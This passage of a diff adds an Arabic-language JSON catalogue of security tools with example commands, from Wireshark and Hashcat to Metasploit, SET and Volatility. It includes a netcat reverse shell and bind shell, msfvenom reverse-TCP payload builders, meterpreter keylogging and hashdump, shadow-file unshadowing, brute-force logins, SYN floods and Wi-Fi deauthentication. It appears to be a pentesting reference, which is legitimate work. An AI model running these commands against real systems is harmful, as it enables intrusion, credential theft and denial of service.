+    "tags": ["اكتشاف", "recursive", "سريع"],
+    "commands": [
+      { "title": "فحص أساسي", "cmd": "feroxbuster -u http://example.com -w wordlist.txt" },
+      { "title": "مع recursion", "cmd": "feroxbuster -u http://example.com -w wordlist.txt --recursive" },
+      { "title": "تحديد عمق recursion", "cmd": "feroxbuster -u http://example.com -w wordlist.txt --depth 3" },
+      { "title": "فحص امتدادات محددة", "cmd": "feroxbuster -u http://example.com -w wordlist.txt -x php,html,bak" },
+      { "title": "تصفية بالحجم", "cmd": "feroxbuster -u http://example.com -w wordlist.txt -S 423" },
+      { "title": "تحديد خيوط", "cmd": "feroxbuster -u http://example.com -w wordlist.txt -t 100" },
+      { "title": "تصدير", "cmd": "feroxbuster -u http://example.com -w wordlist.txt -o results.txt" }
+    ]
+  },
+  {
+    "id": 33,
+    "name": "Wireshark",
+    "category": "net",
+    "categoryName": "تحليل الشبكات",
+    "catIcon": "fa-network-wired",
+    "catColor": 3,
+    "os": "cross",
+    "description": "أشهر أداة لتحليل حزم الشبكة والتقاطها في الوقت الفعلي",
+    "tags": ["تحليل حزم", "التقاط", "بروتوكولات"],
+    "commands": [
+      { "title": "تشغيل واجهة رسومية", "cmd": "wireshark" },
+      { "title": "التقاط من واجهة محددة", "cmd": "wireshark -i eth0" },
+      { "title": "قراءة ملف التقاط", "cmd": "wireshark -r capture.pcap" },
+      { "title": "التقاط مع فلتر", "cmd": "wireshark -i eth0 -f \"port 80\"" },
+      { "title": "TShark أساسي", "cmd": "tshark -i eth0" },
+      { "title": "TShark منافذ محددة", "cmd": "tshark -i eth0 -f \"port 80 or port 443\"" },
+      { "title": "TShark بروتوكولات فقط", "cmd": "tshark -r capture.pcap -T fields -e frame.protocols" },
+      { "title": "TShark تصفية HTTP", "cmd": "tshark -r capture.pcap -Y \"http.request\"" },
+      { "title": "TShark تصفية DNS", "cmd": "tshark -r capture.pcap -Y \"dns.qry.name\"" },
+      { "title": "TShark استخراج IPs", "cmd": "tshark -r capture.pcap -T fields -e ip.src -e ip.dst" },
+      { "title": "TShark تصفية TCP منفذ", "cmd": "tshark -r capture.pcap -Y \"tcp.port == 22\"" },
+      { "title": "TShark حفظ مفلتر", "cmd": "tshark -i eth0 -w filtered.pcap -f \"host 192.168.1.1\"" },
+      { "title": "TShark Follow TCP Stream", "cmd": "tshark -r capture.pcap -q -z follow,tcp,raw,0" },
+      { "title": "EditCap تقسيم ملف", "cmd": "editcap -c 1000 input.pcap output.pcap" }
+    ]
+  },
+  {
+    "id": 34,
+    "name": "tcpdump",
+    "category": "net",
+    "categoryName": "تحليل الشبكات",
+    "catIcon": "fa-network-wired",
+    "catColor": 3,
+    "os": "linux",
+    "description": "أداة التقاط حزم الشبكة من سطر الأوامر",
+    "tags": ["التقاط", "حزم", "سطر أوامر"],
+    "commands": [
+      { "title": "التقاط جميع الحزم", "cmd": "tcpdump -i eth0" },
+      { "title": "التقاط عدد محدد", "cmd": "tcpdump -i eth0 -c 100" },
+      { "title": "التقاط منفذ محدد", "cmd": "tcpdump -i eth0 port 80" },
+      { "title": "التقاط من والى IP محدد", "cmd": "tcpdump -i eth0 host 192.168.1.1" },
+      { "title": "التقاط TCP فقط", "cmd": "tcpdump -i eth0 tcp" },
+      { "title": "التقاط مع عرض المحتوى", "cmd": "tcpdump -i eth0 -X port 80" },
+      { "title": "التقاط ASCII فقط", "cmd": "tcpdump -i eth0 -A port 80" },
+      { "title": "حفظ في ملف", "cmd": "tcpdump -i eth0 -w capture.pcap" },
+      { "title": "قراءة ملف", "cmd": "tcpdump -r capture.pcap" },
+      { "title": "التقاط بدون حل أسماء", "cmd": "tcpdump -i eth0 -nn port 80" },
+      { "title": "التقاط VLAN", "cmd": "tcpdump -i eth0 vlan 100" },
+      { "title": "التقاط ICMP", "cmd": "tcpdump -i eth0 icmp" }
+    ]
+  },
+  {
+    "id": 35,
+    "name": "Netcat",
+    "category": "net",
+    "categoryName": "تحليل الشبكات",
+    "catIcon": "fa-network-wired",
+    "catColor": 3,
+    "os": "cross",
+    "description": "سكين الجيش السويسري للشبكات قراءة وكتابة اتصالات TCP وUDP",
+    "tags": ["اتصالات", "TCP", "UDP", "متعدد الاستخدامات"],
+    "commands": [
+      { "title": "الاستماع على منفذ", "cmd": "nc -lvp 4444" },
+      { "title": "الاتصال بمنفذ", "cmd": "nc 192.168.1.1 80" },
+      { "title": "نقل ملف مستقبل", "cmd": "nc -lvp 4444 > received.txt" },
+      { "title": "نقل ملف مرسل", "cmd": "nc 192.168.1.1 4444 < file.txt" },
+      { "title": "فحص منفذ", "cmd": "nc -zv 192.168.1.1 80" },
+      { "title": "فحص نطاق منافذ", "cmd": "nc -zv 192.168.1.1 1-1000" },
+      { "title": "إنشاء chat", "cmd": "nc -lvp 4444" },
+      { "title": "نقل دليل كامل", "cmd": "tar czf - /dir | nc -lvp 4444" },
+      { "title": "استقبال دليل", "cmd": "nc 192.168.1.1 4444 | tar xzf -" },
+      { "title": "UDP", "cmd": "nc -u -lvp 4444" },
+      { "title": "Reverse Shell", "cmd": "nc -e /bin/bash 192.168.1.1 4444" },
+      { "title": "Bind Shell", "cmd": "nc -lvp 4444 -e /bin/bash" },
+      { "title": "فحص مع timeout", "cmd": "nc -zv -w 3 192.168.1.1 80" }
+    ]
+  },
+  {
+    "id": 36,
+    "name": "Hping3",
+    "category": "net",
+    "categoryName": "تحليل الشبكات",
+    "catIcon": "fa-network-wired",
+    "catColor": 3,
+    "os": "linux",
+    "description": "أداة لتجميع وإرسال حزم TCP/IP مخصصة لاختبار الشبكات",
+    "tags": ["حزم مخصصة", "TCP", "ICMP", "اختبار"],
+    "commands": [
+      { "title": "إرسال ICMP ping", "cmd": "hping3 -1 192.168.1.1" },
+      { "title": "TCP SYN scan", "cmd": "hping3 -S -p 80 192.168.1.1" },
+      { "title": "TCP ACK scan", "cmd": "hping3 -A -p 80 192.168.1.1" },
+      { "title": "UDP scan", "cmd": "hping3 --udp -p 53 192.168.1.1" },
+      { "title": "إرسال بمعدل محدد", "cmd": "hping3 -S -p 80 -i u1000 192.168.1.1" },
+      { "title": "Spoofed source", "cmd": "hping3 -a 10.0.0.1 -S -p 80 192.168.1.1" },
+      { "title": "Flood", "cmd": "hping3 -S -p 80 --flood 192.168.1.1" },
+      { "title": "تحديد حجم الحزمة", "cmd": "hping3 -d 1000 -S -p 80 192.168.1.1" },
+      { "title": "Traceroute", "cmd": "hping3 --traceroute 192.168.1.1" }
+    ]
+  },
+  {
+    "id": 37,
+    "name": "Traceroute",
+    "category": "net",
+    "categoryName": "تحليل الشبكات",
+    "catIcon": "fa-network-wired",
+    "catColor": 3,
+    "os": "cross",
+    "description": "تتبع مسار الحزم عبر الشبكة لتحديد نقاط التوجيه",
+    "tags": ["تتبع", "مسار", "توجيه"],
+    "commands": [
+      { "title": "تتبع أساسي", "cmd": "traceroute example.com" },
+      { "title": "باستخدام ICMP", "cmd": "traceroute -I example.com" },
+      { "title": "باستخدام TCP", "cmd": "traceroute -T example.com" },
+      { "title": "تحديد منفذ", "cmd": "traceroute -T -p 80 example.com" },
+      { "title": "تحديد عدد القفزات", "cmd": "traceroute -m 20 example.com" },
+      { "title": "عدم حل الأسماء", "cmd": "traceroute -n example.com" },
+      { "title": "MTR بديل متقدم", "cmd": "mtr example.com" },
+      { "title": "MTR تقرير", "cmd": "mtr --report example.com" }
+    ]
+  },
+  {
+    "id": 38,
+    "name": "NetworkMiner",
+    "category": "net",
+    "categoryName": "تحليل الشبكات",
+    "catIcon": "fa-network-wired",
+    "catColor": 3,
+    "os": "windows",
+    "description": "أداة تحقيق شبكات تستخرج تلقائيا الصور والملفات من حزم الشبكة",
+    "tags": ["تحقيق", "استخراج", "تحليل"],
+    "commands": [
+      { "title": "تشغيل واجهة رسومية", "cmd": "NetworkMiner" },
+      { "title": "تحليل ملف pcap", "cmd": "NetworkMiner.exe --pcap capture.pcap" },
+      { "title": "التقاط مباشر", "cmd": "NetworkMiner.exe --capture --network eth0" }
+    ]
+  },
+  {
+    "id": 39,
+    "name": "Hashcat",
+    "category": "pass",
+    "categoryName": "كسر كلمات المرور",
+    "catIcon": "fa-key",
+    "catColor": 4,
+    "os": "cross",
+    "description": "أسرع أداة لكسر تشفير كلمات المرور باستخدام GPU",
+    "tags": ["تجزئة", "GPU", "سريع", "كسر"],
+    "commands": [
+      { "title": "كسر MD5 بالقاموس", "cmd": "hashcat -m 0 hash.txt wordlist.txt" },
+      { "title": "كسر SHA-256", "cmd": "hashcat -m 1400 hash.txt wordlist.txt" },
+      { "title": "كسر SHA-512", "cmd": "hashcat -m 1700 hash.txt wordlist.txt" },
+      { "title": "Brute force MD5", "cmd": "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a" },
+      { "title": "قاعدة تحويل mangling", "cmd": "hashcat -m 0 -r rules.txt hash.txt wordlist.txt" },
+      { "title": "كسر NTLM", "cmd": "hashcat -m 1000 hash.txt wordlist.txt" },
+      { "title": "كسر WPA2", "cmd": "hashcat -m 2500 capture.hccapx wordlist.txt" },
+      { "title": "عرض التشفيرات المدعومة", "cmd": "hashcat --help | grep \"Hash modes\"" },
+      { "title": "عرض كلمة المرور المكسورة", "cmd": "hashcat -m 0 hash.txt --show" },
+      { "title": "تحديد جلسة", "cmd": "hashcat -m 0 hash.txt wordlist.txt --session mysession" },
+      { "title": "استئناف جلسة", "cmd": "hashcat --session mysession --restore" },
+      { "title": "تحسين الأداء", "cmd": "hashcat -m 0 -a 0 hash.txt wordlist.txt -O" },
+      { "title": "كسر bcrypt", "cmd": "hashcat -m 3200 hash.txt wordlist.txt" },
+      { "title": "كسر ZIP", "cmd": "hashcat -m 13600 hash.txt wordlist.txt" },
+      { "title": "كسر RAR5", "cmd": "hashcat -m 23800 hash.txt wordlist.txt" }
+    ]
+  },
+  {
+    "id": 40,
+    "name": "John the Ripper",
+    "category": "pass",
+    "categoryName": "كسر كلمات المرور",
+    "catIcon": "fa-key",
+    "catColor": 4,
+    "os": "cross",
+    "description": "أداة كلاسيكية لكسر تشفير كلمات المرور بعدة أنماط",
+    "tags": ["تجزئة", "كسر", "قاموس"],
+    "commands": [
+      { "title": "كسر أساسي", "cmd": "john hash.txt" },
+      { "title": "مع قاموس محدد", "cmd": "john --wordlist=wordlist.txt hash.txt" },
+      { "title": "تحديد نوع التجزئة", "cmd": "john --format=md5 hash.txt" },
+      { "title": "Brute force", "cmd": "john --format=md5 --incremental hash.txt" },
+      { "title": "قواعد تحويل", "cmd": "john --wordlist=wordlist.txt --rules hash.txt" },
+      { "title": "عرض النتائج", "cmd": "john --show hash.txt" },
+      { "title": "عرض الأوضاع", "cmd": "john --list=formats" },
+      { "title": "كسر NTLM", "cmd": "john --format=nt hash.txt --wordlist=wordlist.txt" },
+      { "title": "كسر SHA-256", "cmd": "john --format=raw-sha256 hash.txt --wordlist=wordlist.txt" },
+      { "title": "كسر Linux shadows", "cmd": "john --format=sha512crypt unshadowed.txt" },
+      { "title": "Unshadow ملفات Linux", "cmd": "unshadow /etc/passwd /etc/shadow > unshadowed.txt" }
+    ]
+  },
+  {
+    "id": 41,
+    "name": "Hydra",
+    "category": "pass",
+    "categoryName": "كسر كلمات المرور",
+    "catIcon": "fa-key",
+    "catColor": 4,
+    "os": "cross",
+    "description": "أداة Brute Force سريعة لاختبار كلمات المرور عبر بروتوكولات متعددة",
+    "tags": ["brute force", "بروتوكولات", "اتصالات"],
+    "commands": [
+      { "title": "هجوم على SSH", "cmd": "hydra -l admin -P wordlist.txt ssh://192.168.1.1" },
+      { "title": "هجوم على FTP", "cmd": "hydra -l admin -P wordlist.txt ftp://192.168.1.1" },
+      { "title": "هجوم على HTTP POST", "cmd": "hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\"" },
+      { "title": "هجوم على HTTP GET", "cmd": "hydra -l admin -P wordlist.txt 192.168.1.1 http-get-form \"/admin/?user=^USER^&pass=^PASS^:F=failed\"" },
+      { "title": "هجوم على MySQL", "cmd": "hydra -l root -P wordlist.txt mysql://192.168.1.1" },
+      { "title": "هجوم على RDP", "cmd": "hydra -l admin -P wordlist.txt rdp://192.168.1.1" },
+      { "title": "هجوم على SMTP", "cmd": "hydra -l admin -P wordlist.txt smtp://192.168.1.1" },
+      { "title": "هجوم على VNC", "cmd": "hydra -P wordlist.txt vnc://192.168.1.1" },
+      { "title": "تحديد عدد الخيوط", "cmd": "hydra -l admin -P wordlist.txt -t 20 ssh://192.168.1.1" },
+      { "title": "هجوم على عدة أهداف", "cmd": "hydra -l admin -P wordlist.txt -L targets.txt ssh" },
+      { "title": "قائمة مستخدمين", "cmd": "hydra -L users.txt -P wordlist.txt ssh://192.168.1.1" }
+    ]
+  },
+  {
+    "id": 42,
+    "name": "CeWL",
+    "category": "pass",
+    "categoryName": "كسر كلمات المرور",
+    "catIcon": "fa-key",
+    "catColor": 4,
+    "os": "linux",
+    "description": "توليد قوائم كلمات مرور مخصصة من زحف موقع ويب",
+    "tags": ["قاموس", "زحف", "توليد"],
+    "commands": [
+      { "title": "توليد من موقع", "cmd": "cewl http://example.com -w wordlist.txt" },
+      { "title": "تحديد عمق الزحف", "cmd": "cewl http://example.com -d 3 -w wordlist.txt" },
+      { "title": "الحد الأدنى لحجم الكلمة", "cmd": "cewl http://example.com -m 6 -w wordlist.txt" },
+      { "title": "مع مصادقة", "cmd": "cewl http://example.com -u admin -p pass -w wordlist.txt" },
+      { "title": "تحويل لحالة صغيرة", "cmd": "cewl http://example.com --lowercase -w wordlist.txt" }
+    ]
+  },
+  {
+    "id": 43,
+    "name": "Crunch",
+    "category": "pass",
+    "categoryName": "كسر كلمات المرور",
+    "catIcon": "fa-key",
+    "catColor": 4,
+    "os": "linux",
+    "description": "توليد قوائم كلمات مرور بناء على أنماط وأحرف محددة",
+    "tags": ["توليد", "أنماط", "قاموس"],
+    "commands": [
+      { "title": "كل التركيبات 4 أحرف", "cmd": "crunch 4 4 abcd -o wordlist.txt" },
+      { "title": "حرف صغير فقط", "cmd": "crunch 6 6 -f /usr/share/crunch/charset.lst loweralpha -o wordlist.txt" },
+      { "title": "نمط محدد", "cmd": "crunch 8 8 -t @@@@%%%% -o wordlist.txt" },
+      { "title": "بدون مسافات", "cmd": "crunch 6 6 abcdef123456 -o wordlist.txt" },
+      { "title": "بدء من نمط", "cmd": "crunch 4 4 -f charset.lst mixalpha -s abcd -o wordlist.txt" }
+    ]
+  },
+  {
+    "id": 44,
+    "name": "Medusa",
+    "category": "pass",
+    "categoryName": "كسر كلمات المرور",
+    "catIcon": "fa-key",
+    "catColor": 4,
+    "os": "linux",
+    "description": "أداة Brute Force متوازية تدعم بروتوكولات متعددة",
+    "tags": ["brute force", "متوازي", "بروتوكولات"],
+    "commands": [
+      { "title": "هجوم SSH", "cmd": "medusa -h 192.168.1.1 -u admin -P wordlist.txt -M ssh" },
+      { "title": "هجوم FTP", "cmd": "medusa -h 192.168.1.1 -u admin -P wordlist.txt -M ftp" },
+      { "title": "هجوم HTTP", "cmd": "medusa -h 192.168.1.1 -u admin -P wordlist.txt -M http" },
+      { "title": "تحديد خيوط", "cmd": "medusa -h 192.168.1.1 -u admin -P wordlist.txt -M ssh -t 20" },
+      { "title": "عدة أهداف", "cmd": "medusa -H hosts.txt -u admin -P wordlist.txt -M ssh" }
+    ]
+  },
+  {
+    "id": 45,
+    "name": "Aircrack-ng",
+    "category": "wireless",
+    "categoryName": "الشبكات اللاسلكية",
+    "catIcon": "fa-wifi",
+    "catColor": 5,
+    "os": "linux",
+    "description": "مجموعة أدوات شاملة لاختبار أمان شبكات WiFi",
+    "tags": ["WiFi", "WEP", "WPA", "شبكات لاسلكية"],
+    "commands": [
+      { "title": "تفعيل وضع المراقبة", "cmd": "airmon-ng start wlan0" },
+      { "title": "تعطيل وضع المراقبة", "cmd": "airmon-ng stop wlan0mon" },
+      { "title": "قتل العمليات المزعجة", "cmd": "airmon-ng check kill" },
+      { "title": "اكتشاف الشبكات", "cmd": "airodump-ng wlan0mon" },
+      { "title": "الاستماع على قناة محددة", "cmd": "airodump-ng -c 6 wlan0mon" },
+      { "title": "التقاط Handshake", "cmd": "airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon" },
+      { "title": "Deauthentication هجوم", "cmd": "aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon" },
+      { "title": "كسر WPA/WPA2", "cmd": "aircrack-ng -w wordlist.txt capture-01.cap" },
+      { "title": "كسر WEP", "cmd": "aircrack-ng capture-01.cap" }
+    ]
+  },
+  {
+    "id": 46,
+    "name": "Wifite",
+    "category": "wireless",
+    "categoryName": "الشبكات اللاسلكية",
+    "catIcon": "fa-wifi",
+    "catColor": 5,
+    "os": "linux",
+    "description": "أداة آلية لاختبار شبكات WiFi بضغطة واحدة",
+    "tags": ["WiFi", "آلي", "WPA"],
+    "commands": [
+      { "title": "تشغيل تلقائي", "cmd": "wifite" },
+      { "title": "استهداف شبكة محددة", "cmd": "wifite --kill --target AA:BB:CC:DD:EE:FF" },
+      { "title": "تحديد قاموس", "cmd": "wifite --dict wordlist.txt" },
+      { "title": "WPA فقط", "cmd": "wifite --wpa" },
+      { "title": "WEP فقط", "cmd": "wifite --wep" },
+      { "title": "تحديد واجهة", "cmd": "wifite --iface wlan0mon" }
+    ]
+  },
+  {
+    "id": 47,
+    "name": "Kismet",
+    "category": "wireless",
+    "categoryName": "الشبكات اللاسلكية",
+    "catIcon": "fa-wifi",
+    "catColor": 5,
+    "os": "linux",
+    "description": "كاشف شبكات لاسلكية و sniffing واكتشاف أجهزة GPS",
+    "tags": ["WiFi", "كشف", "sniffing", "GPS"],
+    "commands": [
+      { "title": "تشغيل Kismet", "cmd": "kismet" },
+      { "title": "تحديد واجهة", "cmd": "kismet -c wlan0mon" },
+      { "title": "تشغيل في الخلفية", "cmd": "kismet -d --daemonize" },
+      { "title": "مع خادم ويب", "cmd": "kismet --webui=true" }
+    ]
+  },
+  {
+    "id": 48,
+    "name": "Metasploit Framework",
+    "category": "exploit",
+    "categoryName": "الاستغلال",
+    "catIcon": "fa-skull-crossbones",
+    "catColor": 6,
+    "os": "linux",
+    "description": "أقوى إطار عمل لاختبار الاختراق مع آلاف الاستغلالات",
+    "tags": ["إطار عمل", "استغلال", "payload", "شامل"],
+    "commands": [
+      { "title": "تشغيل Metasploit", "cmd": "msfconsole" },
+      { "title": "البحث عن استغلال", "cmd": "search type:exploit platform:windows smb" },
+      { "title": "اختيار استغلال", "cmd": "use exploit/windows/smb/ms17_010_eternalblue" },
+      { "title": "عرض الخيارات", "cmd": "show options" },
+      { "title": "تعيين RHOST", "cmd": "set RHOSTS 192.168.1.1" },
+      { "title": "تعيين payload", "cmd": "set PAYLOAD windows/x64/meterpreter/reverse_tcp" },
+      { "title": "تعيين LHOST", "cmd": "set LHOST 192.168.1.100" },
+      { "title": "تنفيذ الاستغلال", "cmd": "exploit" },
+      { "title": "معلومات النظام", "cmd": "sysinfo" },
+      { "title": "معلومات المستخدم", "cmd": "getuid" },
+      { "title": "قائمة العمليات", "cmd": "ps" },
+      { "title": "تصعيد صلاحيات", "cmd": "getsystem" },
+      { "title": "Hash Dump", "cmd": "hashdump" },
+      { "title": "توجيه الشبكة", "cmd": "run autoroute -s" },
+      { "title": "لقطة شاشة", "cmd": "screenshot" },
+      { "title": "بدء تسجيل مفاتيح", "cmd": "keyscan_start" },
+      { "title": "عرض المفاتيح", "cmd": "keyscan_dump" },
+      { "title": "نزول ملف", "cmd": "download C:\\\\file.txt" },
+      { "title": "رفع ملف", "cmd": "upload /local/file.txt C:\\\\" },
+      { "title": "Shell عادي", "cmd": "shell" },
+      { "title": "Payload Windows EXE", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe" },
+      { "title": "Payload PHP", "cmd": "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php" },
+      { "title": "Payload JSP", "cmd": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp" },
+      { "title": "Payload Python", "cmd": "msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.py" },
+      { "title": "Payload Linux ELF", "cmd": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf" },
+      { "title": "Payload macOS", "cmd": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o shell.macho" },
+      { "title": "Payload DLL", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o evil.dll" },
+      { "title": "Encoding Payload", "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe" },
+      { "title": "عرض payloads", "cmd": "show payloads" },
+      { "title": "استغلالات Windows", "cmd": "show exploits | grep windows" }
+    ]
+  },
+  {
+    "id": 49,
+    "name": "SearchSploit",
+    "category": "exploit",
+    "categoryName": "الاستغلال",
+    "catIcon": "fa-skull-crossbones",
+    "catColor": 6,
+    "os": "linux",
+    "description": "واجهة سطر أوامر لقاعدة بيانات Exploit-DB المحلية",
+    "tags": ["ثغرات", "استغلال", "بحث"],
+    "commands": [
+      { "title": "بحث بكلمة مفتاحية", "cmd": "searchsploit apache 2.4" },
+      { "title": "بحث بالمنفذ", "cmd": "searchsploit -p 80" },
+      { "title": "نسخ استغلال", "cmd": "searchsploit -m 12345" },
+      { "title": "بدون ألوان", "cmd": "searchsploit --nocolour apache" },
+      { "title": "تحديث قاعدة البيانات", "cmd": "searchsploit -u" },
+      { "title": "JSON output", "cmd": "searchsploit --json apache > results.json" }
+    ]
+  },
+  {
+    "id": 50,
+    "name": "BeEF",
+    "category": "exploit",
+    "categoryName": "الاستغلال",
+    "catIcon": "fa-skull-crossbones",
+    "catColor": 6,
+    "os": "cross",
+    "description": "إطار عمل لاستغلال متصفحات الويب Browser Exploitation Framework",
+    "tags": ["متصفح", "جافاسكربت", "هوك"],
+    "commands": [
+      { "title": "تشغيل BeEF", "cmd": "beef" },
+      { "title": "تحديد واجهة", "cmd": "beef -i eth0" },
+      { "title": "تحديد منفذ", "cmd": "beef -p 8080" }
+    ]
+  },
+  {
+    "id": 51,
+    "name": "Cobalt Strike",
+    "category": "exploit",
+    "categoryName": "الاستغلال",
+    "catIcon": "fa-skull-crossbones",
+    "catColor": 6,
+    "os": "cross",
+    "description": "منصة متقدمة لاختبار الاختراق والتهديدات المستمرة تجاري",
+    "tags": ["C2", "متقدم", "commercial"],
+    "commands": [
+      { "title": "تشغيل Team Server", "cmd": "./teamserver 192.168.1.100 password" },
+      { "title": "تشغيل العميل", "cmd": "./aggressor" }
+    ]
+  },
+  {
+    "id": 52,
+    "name": "Autopsy",
+    "category": "forensics",
+    "categoryName": "التحقيق الرقمي",
+    "catIcon": "fa-fingerprint",
+    "catColor": 7,
+    "os": "cross",
+    "description": "واجهة رسومية لتحليل القرص الصلب والتحقيق الرقمي",
+    "tags": ["قرص صلب", "تحليل", "صور"],
+    "commands": [
+      { "title": "تشغيل Autopsy", "cmd": "autopsy" },
+      { "title": "إنشاء حالة", "cmd": "autopsy --create-case \"Case Name\" /path/to/case" }
+    ]
+  },
+  {
+    "id": 53,
+    "name": "Volatility",
+    "category": "forensics",
+    "categoryName": "التحقيق الرقمي",
+    "catIcon": "fa-fingerprint",
+    "catColor": 7,
+    "os": "cross",
+    "description": "إطار عمل لتحليل الذاكرة RAM واستخراج الأدلة",
+    "tags": ["ذاكرة", "RAM", "تحليل"],
+    "commands": [
+      { "title": "تحديد نظام التشغيل", "cmd": "vol.py -f memory.dmg imageinfo" },
+      { "title": "قائمة العمليات", "cmd": "vol.py -f memory.dmg --profile=Win7SP1x64 pslist" },
+      { "title": "شجرة العمليات", "cmd": "vol.py -f memory.dmg --profile=Win7SP1x64 pstree" },
+      { "title": "اتصالات الشبكة", "cmd": "vol.py -f memory.dmg --profile=Win7SP1x64 netscan" },
+      { "title": "Hash Dump", "cmd": "vol.py -f memory.dmg --profile=Win7SP1x64 hashdump" },
+      { "title": "استخراج DLLs", "cmd": "vol.py -f memory.dmg --profile=Win7SP1x64 dlllist --pid 1234" },
+      { "title": "سجل الأوامر", "cmd": "vol.py -f memory.dmg --profile=Win7SP1x64 cmdscan" },
+      { "title": "ملفات مفتوحة", "cmd": "vol.py -f memory.dmg --profile=Win7SP1x64 filescan" },
+      { "title": "استخراج ملف من الذاكرة", "cmd": "vol.py -f memory.dmg --profile=Win7SP1x64 dumpfiles --physaddr 0x12345678" }
+    ]
+  },
+  {
+    "id": 54,
+    "name": "Binwalk",
+    "category": "forensics",
+    "categoryName": "التحقيق الرقمي",
+    "catIcon": "fa-fingerprint",
+    "catColor": 7,
+    "os": "linux",
+    "description": "تحليل الصور الثنائية واستخراج الملفات المضمنة",
+    "tags": ["تحليل ثنائي", "استخراج", "firmware"],
+    "commands": [
+      { "title": "فحص ملف", "cmd": "binwalk firmware.bin" },
+      { "title": "استخراج تلقائي", "cmd": "binwalk -e firmware.bin" },
+      { "title": "فحص توقيعات فقط", "cmd": "binwalk --signature firmware.bin" },
+      { "title": "فحص إنتروبيا", "cmd": "binwalk -E firmware.bin" },
+      { "title": "مقارنة ملفات", "cmd": "binwalk --compare file1.bin file2.bin" },
+      { "title": "فحص بصيغة HEX", "cmd": "binwalk -Y firmware.bin" }
+    ]
+  },
+  {
+    "id": 55,
+    "name": "Foremost",
+    "category": "forensics",
+    "categoryName": "التحقيق الرقمي",
+    "catIcon": "fa-fingerprint",
+    "catColor": 7,
+    "os": "linux",
+    "description": "استخراج الملفات من صور القرص بناء على رؤوس الملفات",
+    "tags": ["استخراج", "صور قرص", "ملفات"],
+    "commands": [
+      { "title": "استخراج من صورة", "cmd": "foremost -i disk.img -o output/" },
+      { "title": "تحديد أنواع ملفات", "cmd": "foremost -t jpg,png,pdf -i disk.img -o output/" },
+      { "title": "من ملف التقاط شبكة", "cmd": "foremost -t all -i capture.pcap -o output/" }
+    ]
+  },
+  {
+    "id": 56,
+    "name": "Sleuth Kit",
+    "category": "forensics",
+    "categoryName": "التحقيق الرقمي",
+    "catIcon": "fa-fingerprint",
+    "catColor": 7,
+    "os": "cross",
+    "description": "مجموعة أدوات سطر أوامر لتحليل أنظمة الملفات والقرص",
+    "tags": ["أنظمة ملفات", "قرص", "تحليل"],
+    "commands": [
+      { "title": "عرض الأقسام", "cmd": "mmls disk.img" },
+      { "title": "عرض الملفات", "cmd": "fls -r -o 2048 disk.img" },
+      { "title": "استخراج ملف", "cmd": "icat -o 2048 disk.img 12345 > file.txt" },
+      { "title": "فحص نظام الملفات", "cmd": "fsstat -o 2048 disk.img" },
+      { "title": "عرض جدول MFT", "cmd": "fls -m \"C:\" -o 2048 disk.img" }
+    ]
+  },
+  {
+    "id": 57,
+    "name": "SET",
+    "category": "social",
+    "categoryName": "الهندسة الاجتماعية",
+    "catIcon": "fa-user-secret",
+    "catColor": 8,
+    "os": "linux",
+    "description": "إطار عمل متكامل لاختبار الهندسة الاجتماعية",
+    "tags": ["تصيد", "موقع مزيف", "payload"],
+    "commands": [
+      { "title": "تشغيل SET", "cmd": "setoolkit" },
+      { "title": "هجوم التصيد الكامل", "cmd": "setoolkit\n# اختر: 1) Social-Engineering Attacks\n# ثم: 2) Website Attack Vectors\n# ثم: 3) Credential Harvester" },
+      { "title": "استنساخ موقع", "cmd": "setoolkit\n# Site Cloner -> أدخل URL الموقع المستهدف" },
+      { "title": "هجوم البريد الإلكتروني", "cmd": "setoolkit\n# Mass Mailer Attack" }
+    ]
+  },
+  {
+    "id": 58,
+    "name": "Gophish",
+    "category": "social",
+    "categoryName": "الهندسة الاجتماعية",
+    "catIcon": "fa-user-secret",
+    "catColor": 8,
+    "os": "cross",
+    "description": "إطار عمل احترافي لمحاكاة حملات التصيد",
+    "tags": ["تصيد", "حملات", "تقارير"],
+    "commands": [
+      { "title": "تشغيل Gophish", "cmd": "gophish" },
+      { "title": "تحديد ملف التكوين", "cmd": "gophish -config config.json" },
+      { "title": "الواجهة", "cmd": "https://localhost:3333" }
+    ]
+  },
+  {
+    "id": 59,
+    "name": "King Phisher",
+    "category": "social",
+    "categoryName": "الهندسة الاجتماعية",
+    "catIcon": "fa-user-secret",
+    "catColor": 8,
+    "os": "linux",
+    "description": "منصة لتشغيل حملات التصيد مع تتبع النتائج",
+    "tags": ["تصيد", "تتبع", "حملات"],
+    "commands": [
+      { "title": "تشغيل الخادم", "cmd": "king-phisher" },
+      { "title": "تشغيل العميل", "cmd": "king-phisher-client" }
+    ]
+  },
+  {
+    "id": 60,
+    "name": "Ghidra",
+    "category": "reverse",
+    "categoryName": "الهندسة العكسية",
+    "catIcon": "fa-code",
+    "catColor": 9,
+    "os": "cross",
+    "description": "أداة NSA مفتوحة المصدر للهندسة العكسية وتحليل البرمجيات",
+    "tags": ["تحليل", "decompile", "disassemble"],
+    "commands": [
+      { "title": "تشغيل واجهة رسومية", "cmd": "ghidra" },
+      { "title": "من سطر الأوامر", "cmd": "analyzeHeadless /path/to/project proj -import binary.exe -postScript analyze.py" },
+      { "title": "تصدير decompilation", "cmd": "analyzeHeadless . proj -import binary -decompile" }
+    ]
+  },
+  {
+    "id": 61,
+    "name": "GDB",
+    "category": "reverse",
+    "categoryName": "الهندسة العكسية",
+    "catIcon": "fa-code",
+    "catColor": 9,
+    "os": "linux",
